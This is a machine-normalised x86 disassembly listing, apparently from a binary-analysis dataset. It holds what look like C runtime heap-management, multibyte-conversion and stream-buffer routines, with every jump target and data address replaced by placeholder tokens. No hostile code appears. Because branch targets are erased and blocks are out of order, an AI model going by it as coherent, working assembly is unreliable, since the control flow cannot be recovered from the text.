and [ eax + esi * 4 + 0xc4 ] edi
dec [ ecx ]
jne r-xdata
mov edi 0x80000000
shr edi cl
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0x44 ] edi
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ edx ] ebx
mov [ ebx + edx - 0x4 ] ebx
dec [ eax ]
jne r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
cmp ecx edi
je r-xdata
mov edi edx
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edi
mov ecx [ ebp + 0x8 ]
and [ ecx ] edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call edi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edi - 0x20 ]
mov edi 0x80000000
shr edi cl
lea eax [ eax + esi * 4 + 0xc4 ]
or [ eax ] edi
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edi
shr ebx cl
lea eax [ eax + esi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
mov ebx [ ebp - 0xc ]
add ecx 0xffffffe0
mov edx 0x80000000
shr edx cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0xc4 ] edx
dec [ ecx ]
jne r-xdata
mov edx 0x80000000
shr edx cl
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0x44 ] edx
dec [ ecx ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call edi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_40ade0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
and [ ecx ] edx
jmp r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
sub eax 0x14
mov [ rw-data ] eax
mov [ rw-data ] esi
sub_4098e1
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_409c9b
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_409bea
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_409bea
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_409c9b
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_409d96
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_40a08c
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_40a0a7
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a104
add esp 0xc
mov [ ebp + 0x10 ] eax
test ebx ebx
je r-xdata
push esi
call edi
push 0x13
call sub_408a6f
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_408ad0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40a104
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov al [ esi ]
cmp al bl
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov ecx [ rw-data ]
movzx eax al
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov [ eax ] bx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push esi
push 0x9
push [ rw-data ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jle r-xdata
push 0x1
pop eax
jmp r-xdata
movzx ax al
mov [ ecx ] ax
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp + 0x10 ] eax
jl r-xdata
pop esi
pop ebx
pop ebp
retn
call sub_40acad
mov [ eax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ esi + 0x1 ] bl
jne r-xdata
xor ecx ecx
cmp [ ebp + 0x8 ] ebx
setne cl
push ecx
push [ ebp + 0x8 ]
push eax
push esi
push 0x9
push [ rw-data ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ rw-data ]
jne r-xdata
sub_40a1cd
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
retn
push 0x8
push [ esp + 0x8 ]
call sub_406333
pop ecx
pop ecx
retn
sub_40a200
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov edx eax
xor eax eax
and cl 0x1f
shl edx cl
retn
shld edx eax cl
shl eax cl
retn
sub_40a21f
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
or eax 0xffffffff
pop esi
retn
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or al 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
or al 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_40ad97
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push [ esi + 0x10 ]
call sub_40b115
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
test dl 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
mov ecx [ esi + 0x10 ]
push edi
cmp ecx 0xffffffff
je r-xdata
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
pop esi
retn
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
mov edi rw-data
mov edi ecx
sar edi 0x5
and ecx 0x1f
mov edi [ edi * 4 + rw-data ]
lea ecx [ ecx + ecx * 8 ]
lea edi [ edi + ecx * 4 ]
jmp r-xdata
test ch 0x4
jne r-xdata
or dh 0x20
mov [ esi + 0xc ] edx
mov cl [ edi + 0x4 ]
pop edi
and cl 0x82
cmp cl 0x82
jne r-xdata
mov [ esi + 0x18 ] 0x1000
sub_40a2fb
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx 0xffffffff
push esi
je r-xdata
or eax 0xffffffff
mov esi [ esp + 0x10 ]
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al 0x80
je r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_40ad97
pop ecx
test al 0x2
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
dec [ esi ]
mov eax [ esi ]
mov [ eax ] bl
dec [ esi ]
mov eax [ esi ]
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and al 0xef
or al 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
sub_40a37a
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rw-data ] cl
jne r-xdata
push 0x1
pop eax
retn
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
movzx eax [ eax * 2 + rw-data ]
and eax [ esp + 0x8 ]
jmp r-xdata
retn
test eax eax
jne r-xdata
sub_40a3ab
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push 0x19
call sub_408a6f
push [ ebp + 0x8 ]
call sub_40a558
mov ebx eax
pop ecx
cmp ebx [ rw-data ]
pop ecx
mov [ ebp + 0x8 ] ebx
jne r-xdata
test ebx ebx
je r-xdata
xor esi esi
jmp r-xdata
call sub_40a5d5
xor edx edx
mov eax rw-data
push 0x19
call sub_408ad0
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x4 ] 0x0
push 0x40
pop ecx
xor eax eax
mov edi rw-data
lea esi [ edx + edx * 2 ]
[ edi ]
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jl r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
push 0x1
pop esi
cmp eax esi
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_40a5a2
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x40
and [ rw-data ] 0x0
pop ecx
xor eax eax
mov edi rw-data
cmp [ ebp - 0x18 ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_40a5fe
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or esi 0xffffffff
and [ rw-data ] 0x0
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
mov eax esi
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push ebx
call sub_40a5a2
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] esi
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
